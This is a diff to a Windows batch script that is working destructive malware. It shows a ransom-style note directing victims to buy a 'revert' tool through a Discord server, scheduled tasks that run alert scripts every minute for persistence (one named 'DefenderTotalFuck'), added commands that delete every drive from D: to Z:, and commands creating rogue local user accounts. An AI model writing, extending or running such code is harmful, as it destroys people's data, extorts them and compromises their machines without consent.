@@ -31,7 +31,7 @@ ECHO Most of your data has been lost and we can't restore them >> %USERPROFILE%\
 ECHO Many changes has been set to your computer >> %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt
 ECHO You can manually revert them, or purchase a tool to revert the changes >> %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt
 ECHO Go to this Discord Server (my friend's server, don't request to Discord to ban her) and purchase tool with 200 000 cowoncy. >> %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt
-ECHO Discord Link: https://discord.gg/unicorn-chan
+ECHO Discord Link: https://discord.gg/unicorn-chan >> %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt
 ECHO Wish you a bad day! >> %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt
 
 COPY %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611.txt %USERPROFILE%\Desktop\HACKED_BY_SOMEONE1611_2.txt
@@ -242,45 +242,9 @@ ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and pla
 
 SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert /TR %SERVICEDIR%\alert.bat /IT
 SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt /TR %SERVICEDIR%\alert.vbs /IT
-timeout 2 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert2 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt2 /TR %SERVICEDIR%\alert.vbs /IT
-timeout 1 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert3 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt3 /TR %SERVICEDIR%\alert.vbs /IT
-timeout 2 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert4 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt4 /TR %SERVICEDIR%\alert.vbs /IT
-timeout 1 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert5 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt5 /TR %SERVICEDIR%\alert.vbs /IT
-timeout 2 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert6 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt6 /TR %SERVICEDIR%\alert.vbs /IT
-timeout 3 >nul
-
-SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert7 /TR %SERVICEDIR%\alert.bat /IT
-SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt7 /TR %SERVICEDIR%\alert.vbs /IT
 
 ECHO SCHTASKS /Run /TN virusalert >> %SERVICEDIR%\runit.bat
 ECHO SCHTASKS /Run /TN firewallalert >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert2 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert2 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert3 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert3 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert4 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert4 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert5 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert5 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert6 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert6 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN virusalert7 >> %SERVICEDIR%\runit.bat
-ECHO SCHTASKS /Run /TN firewallalert7 >> %SERVICEDIR%\runit.bat
 
 SCHTASKS /Create /SC MINUTE /MO 1 /TN DefenderTotalFuck /TR %SERVICEDIR%\runit.bat /IT
 
@@ -306,9 +270,38 @@ if exist C:\Dulieu\ del C:\Dulieu /s /q /f
 if exist C:\Dulieu\ rmdir C:\Dulieu /s /q
 
 if exist D:\ rmdir D:\ /s /q
+if exist D:\ del D:\ /s /q
+
 if exist E:\ rmdir E:\ /s /q
+if exist E:\ del E:\ /s /q
+
 if exist F:\ rmdir F:\ /s /q
+if exist F:\ del F:\ /s /q
+
 if exist G:\ rmdir G:\ /s /q
+if exist G:\ del G:\ /s /q
+
+if exist H:\ rmdir H:\ /s /q
+if exist H:\ del H:\ /s /q
+
+if exist I:\ rmdir I:\ /s /q
+if exist J:\ rmdir J:\ /s /q
+if exist K:\ rmdir K:\ /s /q
+if exist L:\ rmdir L:\ /s /q
+if exist M:\ rmdir M:\ /s /q
+if exist N:\ rmdir N:\ /s /q
+if exist O:\ rmdir O:\ /s /q
+if exist P:\ rmdir P:\ /s /q
+if exist Q:\ rmdir Q:\ /s /q
+if exist R:\ rmdir R:\ /s /q
+if exist S:\ rmdir S:\ /s /q
+if exist T:\ rmdir T:\ /s /q
+if exist U:\ rmdir U:\ /s /q
+if exist V:\ rmdir V:\ /s /q
+if exist W:\ rmdir W:\ /s /q
+if exist X:\ rmdir X:\ /s /q
+if exist Y:\ rmdir Y:\ /s /q
+if exist Z:\ rmdir Z:\ /s /q
 
 NET USER HACKER001 Trash0001 /add
 NET USER HACKER002 Trash0001 /add
